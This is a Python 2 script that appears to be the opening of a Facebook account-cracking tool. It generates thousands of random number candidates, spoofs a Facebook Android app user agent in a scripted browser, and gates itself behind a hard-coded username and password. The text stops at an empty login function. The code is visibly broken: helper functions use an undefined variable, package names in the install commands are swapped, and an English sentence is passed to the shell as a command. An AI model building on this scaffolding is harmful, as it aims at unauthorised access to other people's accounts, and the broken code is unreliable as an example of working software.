# Ustad# SIDRA5# Thuglife# USMAN-JUTT# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;92m
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·
в–‘в–€в–€в–€в–€в–€в•—в–‘в–‘в–€в–€в–€в–€в–€в–€в•— в–€в–€в•— в–€в–€в–€в•— в–‘в–‘в–‘в–€в–€в–€в•—
в–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•‘в–€в–€в–€в–€в•—в–‘в–€в–€в–€в–€в•‘
в–€в–€в–€в–€в–€в–€в–€в•‘в•љв–€в–€в–€в–€в–€в•—в–‘в–€в–€в•‘в–€в–€в•”в–€в–€в–€в–€в•”в–€в–€в•‘
в–€в–€в•”в•ђв•ђв–€в–€в•‘в–‘в•љв•ђв•ђв•ђв–€в–€в•—в–€в–€в•‘в–€в–€в•‘в•љв–€в–€в•”в•ќв–€в–€в•‘
в–€в–€в•‘в–‘в–‘в–€в–€в•‘в–€в–€в–€в–€в–€в–€в•”в•ќв–€в–€в•‘в–€в–€в•‘в–‘в•љв•ђв•ќ в–‘в–€в–€в•‘
в•љв•ђв•ќв–‘в–‘в•љв•ђв•ќв•љв•ђв•ђв•ђв•ђв•ђв•ќв–‘в•љв•ђв•ќв•љв•ђв•ќ  в–‘в–‘в–‘в–‘ в–‘в•љв•ђв•ќвЂѓвЂѓ
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·
в•­в”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів•®
в”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓ
в•°в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в•Ї
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·
в”Џв”Ѓв”Ѓв”Ѓв”“в•‹в•‹в•‹в•‹в•‹в•‹в”Џв”“
в”ѓв”Џв”Ѓв”“в”ѓв•‹в•‹в•‹в•‹в•‹в•‹в”ѓв”ѓ
в”ѓв”—в”Ѓв”›в”Јв”Ѓв”Ѓв”ів”Ѓв”ів”Ѓв”›в”Јв”Ѓв”Ѓв”ів”Ѓв”Ѓв”ів”“
в”ѓв”Џв”Ѓв”Ѓв”«в”Џв”“в”ѓв”Џв”«в”Џв”“в”ѓв”Џв”“в”ѓв”Ѓв”Ѓв•‹в”«
в”ѓв”ѓв•‹в•‹в”ѓв”Џв”“в”ѓв”ѓв”ѓв”—в”›в”ѓв”Џв”“в”Јв”Ѓв”Ѓв”ѓв”ѓ
в”—в”›в•‹в•‹в”—в”›в”—в”»в”›в”—в”Ѓв”Ѓв”»в”›в”—в”»в”Ѓв”Ѓв”»в”›
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·

"""

####Logo####

logo1 = """
\033[1;92m
<М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·>М·
в”€в”€в”€в•Ів”€в”€в”€в”€в•±в”€в”€в”€
                 в”€в”€в”€в•±в–”в–”в–”в–”в•Ів”€в”€в”€
                 в”€в”€в”ѓв”€в–‡в”€в”€в–‡в”€в”ѓв”€в”€в”€
                 в•­в•®в”Јв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”«в•­в•®
                 в”ѓв”ѓв”ѓв”€в”€в”€в”€в”€в”€в”ѓв”ѓв”ѓ
                 в•°в•Їв”ѓв”€в”€в”€в”€в”€в”€в”ѓв•°в•Ї
                 в”€в”€в•°в”“в”Џв”Ѓв”Ѓв”“в”Џв•Їв”€в”€
                 в”€в”€в”€в•°в•Їв”€в”€в•°в•Їв”€в”€в”€
<М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·_М·>М·
"""
logo2 = """
\033[1;92m
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в•‘в–€в–€в–€в–€в–€в–€в–€в•‘в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в•‘в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в•‘в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в•‘в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в•‘в•‘в•‘в–€
в”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€
в”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в–€в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€
в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в–€в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€
в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€
в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€
в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€
в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–‘в–‘в–‘в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в–€в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в•‘в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в•‘в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–„в–€в–€в–„в–„в–€в–€в–„
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–Ђв–€в–€в–€в–€в–€в–€в–€в–€в–Ђ
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–Ђв–€в–€в–€в–€в–Ђ
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–„в–„в–„в–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–Ђв–Ђв–Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–Ђв–Ђв–Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–Ђв–Ђв–Ђв–€в–€в–€в–€
в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–„в–€в–€в–€в–€в–€в–ЂвЂѓ
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·
в•­в”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів”ів•®
в”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓв”ѓ
в•°в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в”»в•Ї
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·
в–‘в–€в–€в–€в–€в–€в–€в•—в–€в–€в–€в–€в–€в–€в–€в–€в•—в–‘в–€в–€в–€в–€в–€в•—в–‘в–€в–€в–€в–€в–€в–€в•—в–‘
в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв•љв•ђв•ђв–€в–€в•”в•ђв•ђв•ќв–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв–€в–€в•—
в•љв–€в–€в–€в–€в–€в•—в–‘в–‘в–‘в–‘в–€в–€в•‘в–‘в–‘в–‘в–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в–€в–€в–€в–€в•”в•ќ
в–‘в•љв•ђв•ђв•ђв–€в–€в•—в–‘в–‘в–‘в–€в–€в•‘в–‘в–‘в–‘в–€в–€в•”в•ђв•ђв–€в–€в•‘в–€в–€в•”в•ђв•ђв–€в–€в•—
в–€в–€в–€в–€в–€в–€в•”в•ќв–‘в–‘в–‘в–€в–€в•‘в–‘в–‘в–‘в–€в–€в•‘в–‘в–‘в–€в–€в•‘в–€в–€в•‘в–‘в–‘в–€в–€в•‘
в•љв•ђв•ђв•ђв•ђв•ђв•ќв–‘в–‘в–‘в–‘в•љв•ђв•ќв–‘в–‘в–‘в•љв•ђв•ќв–‘в–‘в•љв•ђв•ќв•љв•ђв•ќв–‘в–‘в•љв•ђв•ќ
"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·"М·

"""
CorrectUsername = "Syed"
CorrectPassword = "Syed"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;92mU/N \x1b[1;93mв™¦вљ«в–€в–¶\x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;92mU/P  \x1b[1;93mв™¦вљ«в–€в–¶\x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Usman-Brand
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open 03444697164')
    else:
        print "\033[1;94mWrong Username"
        os.system('03444697164')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
